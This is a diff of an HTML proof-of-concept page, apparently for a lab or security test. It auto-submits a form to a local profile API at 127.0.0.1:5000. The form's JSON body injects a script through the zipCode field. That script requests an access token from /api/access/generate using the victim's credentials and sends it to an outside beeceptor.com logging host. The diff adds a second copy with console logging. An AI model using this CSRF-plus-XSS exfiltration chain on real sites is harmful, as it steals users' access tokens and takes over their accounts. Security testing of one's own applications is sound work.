@@ -1,4 +1,8 @@
 <form action="https://127.0.0.1:5000/api/profile" method="POST" enctype="text/plain">
+  <input name='{"name":"admin","phone":"123","zipCode":"\"><script>console.log(\"[+] XSS payload executed\");fetch(\"/api/access/generate\",{credentials:\"include\"}).then(r=>{console.log(\"[+] Token endpoint status:\",r.status);return r.json()}).then(d=>{console.log(\"[+] Token response:\",d);if(d.access_token){fetch(\"https://anas0x1.free.beeceptor.com/log?token=\"+encodeURIComponent(d.access_token)).then(()=>console.log(\"[+] Exfiltrated\"))}else{console.error(\"[-] No token\")}}).catch(e=>console.error(\"[-] Fetch error:\",e));</script>"}' value=''>
+  <input type="submit">
+</form>
+<script>document.forms[0].submit();</script><form action="https://127.0.0.1:5000/api/profile" method="POST" enctype="text/plain">
   <input name='{"name":"admin","phone":"123","zipCode":"\"><script>fetch(\"/api/access/generate\",{credentials:\"include\"}).then(r=>r.json()).then(d=>{fetch(\"https://anas0x1.free.beeceptor.com/log?token=\"+encodeURIComponent(d.access_token))});</script>"}' value=''>
   <input type="submit">
 </form>
